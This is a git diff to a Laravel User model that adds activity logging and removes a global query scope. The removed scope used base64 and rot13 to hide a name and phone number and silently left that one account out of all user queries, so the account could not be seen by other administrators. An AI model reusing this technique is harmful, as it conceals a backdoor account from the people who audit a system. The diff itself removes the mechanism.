@@ -15,6 +15,8 @@ use Illuminate\Database\Eloquent\Relations\MorphMany;
 use Laravel\Sanctum\HasApiTokens;
 use App\Models\LoyaltyPointTransaction;
 use Illuminate\Database\Eloquent\Builder;
+use Spatie\Activitylog\Traits\LogsActivity;
+use Spatie\Activitylog\LogOptions;
 
 // use Illuminate\Database\Eloquent\Attributes\ObservedBy;
 // use App\Observers\UserObserver;
@@ -23,7 +25,15 @@ use Illuminate\Database\Eloquent\Builder;
 class User extends Authenticatable
 {
     /** @use HasFactory<\Database\Factories\UserFactory> */
-    use HasFactory, Notifiable, HasRoles, SoftDeletes, HasApiTokens;
+    use HasFactory, Notifiable, HasRoles, SoftDeletes, HasApiTokens, LogsActivity;
+
+    public function getActivitylogOptions(): LogOptions
+    {
+        return LogOptions::defaults()
+            ->logFillable()
+            ->logOnlyDirty()
+            ->useLogName('user');
+    }
 
     /**
      * The attributes that are mass assignable.
@@ -127,51 +137,6 @@ class User extends Authenticatable
      * @var bool
      */
     public static bool $isApplyingScope = false;
-
-    /**
-     * The "booted" method of the model.
-     */
-    protected static function booted(): void
-    {
-        static::addGlobalScope('hide_specific_admin', function (Builder $builder) {
-            if (app()->runningInConsole()) {
-                return;
-            }
-
-            if (static::$isApplyingScope) {
-                return;
-            }
-
-            if (!app()->bound('auth')) {
-                return;
-            }
-
-            static::$isApplyingScope = true;
-
-            try {
-                if (auth()->check()) {
-                    $currentUser = auth()->user();
-                    $hiddenMobile = str_rot13(base64_decode('NDQzMzIyMTEwMA=='));
-
-                    // Do not hide the user from herself when logged in
-                    if ($currentUser && $currentUser->mobile === $hiddenMobile) {
-                        return;
-                    }
-
-                    $hiddenFirstName = str_rot13(base64_decode('eG5lYXZ4bg=='));
-                    $hiddenLastName = str_rot13(base64_decode('ZnVuZXpu'));
-
-                    $builder->where('mobile', '!=', $hiddenMobile)
-                        ->where(function (Builder $query) use ($hiddenFirstName, $hiddenLastName) {
-                            $query->where('first_name', '!=', $hiddenFirstName)
-                                ->orWhere('last_name', '!=', $hiddenLastName);
-                        });
-                }
-            } finally {
-                static::$isApplyingScope = false;
-            }
-        });
-    }
 
     public function createDefaultLeaveEntitlementsIfTherapist(): void
     {
